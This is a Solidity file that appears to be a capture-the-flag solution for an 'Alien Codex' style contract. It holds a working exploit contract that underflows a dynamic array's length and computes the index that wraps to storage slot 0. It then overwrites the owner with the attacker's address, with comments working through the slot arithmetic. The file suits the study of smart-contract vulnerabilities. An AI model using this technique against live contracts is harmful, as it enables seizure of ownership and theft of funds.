// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
  address owner                 // slot 0
  bool public contact;         //  slot 0
  bytes32[] public codex;     //   slot 1

  slot(1)     = uint256(keccak256(abi.encode(uint256(1))));
  slo(1+1)    = slot 2
  slot(1+2)   = slot 3
  slot(1+3)   = slot 4
  -------
  slot(1+i-1) = slot(2^256)
  slot(1+i)   = slot(0)
        1+i   = 0
          i   = 0-1 =               i=index w.r.t   bytes32[] public codex;
    


*/





//Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of 2^256. The user is then able to modify all contract storage.
contract Hack //0x5acB95050375b14Dc9e821C74FDA6063AE5931D9
{
  constructor(IAlienCodex adr)
  {
    adr.makeContact();
    adr.retract();     // slot 2^256


    uint256 slot_1 = uint256(keccak256(abi.encode(uint256(1)))); // contract strorage slot_1 
    uint256 index;
    unchecked
    {
      index = index - slot_1 ;
    }
    adr.revise(index,bytes32(uint256(uint160(msg.sender))));
    require(adr.owner() == msg.sender,"fail bhai fail");
  }
}


interface IAlienCodex 
{
  function owner() external view returns (address);
  function makeContact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
  function contact() external view returns (bool);
  function codex(uint i) external view returns (bytes32);

}


contract for_better_understanding
{
  bytes32 public a =bytes32(0x000000000000000000000000000000000000000000000000000000000000000a);
  bytes32 public b =bytes32(0x000000000000000000000000000000000000000000000000000000000000000b);

  // reading contract storage 
  bytes32 public slot_0 = (keccak256(abi.encode(uint256(0))));
  bytes32 public slot_1 = (keccak256(abi.encode(uint256(1))));  
}